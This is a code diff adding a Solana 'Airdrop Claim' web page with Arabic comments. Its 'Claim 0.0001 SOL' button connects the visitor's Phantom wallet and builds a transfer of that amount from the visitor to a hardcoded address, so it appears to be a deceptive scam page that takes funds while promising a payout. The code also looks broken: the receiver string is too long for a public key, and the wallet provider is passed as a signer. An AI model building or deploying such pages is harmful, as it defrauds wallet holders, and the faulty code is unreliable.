@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airdrop Claim</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            background-color: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 32px;
+            text-align: center;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Claim Airdrop</h1>
+        <button id="claimButton">Claim 0.0001 SOL</button>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.31.0/dist/web3.min.js"></script>
+    <script>
+        document.getElementById("claimButton").addEventListener("click", async () => {
+          try {
+            // التحقق من أن محفظة فانتوم متصلة
+            const provider = window.solana;
+            if (provider.isPhantom) {
+              await provider.connect();
+              const walletAddress = provider.publicKey.toString();
+              console.log("Wallet Address: ", walletAddress);
+
+              // الاتصال بشبكة سولانا (devnet أو mainnet)
+              const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("devnet"), "confirmed");
+
+              // تحويل عنوان المحفظة للمفتاح العام
+              const sender = new solanaWeb3.PublicKey(walletAddress);
+              const receiver = new solanaWeb3.PublicKey("1BXuwRz5zCyxfpjui3NkSW13hCnBxN35pDcRuoQRagqbvn6tu8EoWqPsSgBBZLeirYVfnfapws3TWAy4b2myhL2");  // عنوان المرسل إليه
+
+              // إعداد المعاملة
+              const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                  fromPubkey: sender,
+                  toPubkey: receiver,
+                  lamports: 0.0001 * solanaWeb3.LAMPORTS_PER_SOL, // خصم 0.0001 SOL
+                })
+              );
+
+              // إرسال المعاملة
+              const signature = await solanaWeb3.sendAndConfirmTransaction(connection, transaction, [provider], {
+                commitment: "confirmed",
+              });
+              console.log("Transaction Signature", signature);
+              alert("Transaction successful!");
+            } else {
+              alert("Please connect your Phantom wallet.");
+            }
+          } catch (error) {
+            console.error("Transaction failed: ", error);
+            alert("Transaction failed! Please try again.");
+          }
+        });
+    </script>
+
+</body></html>
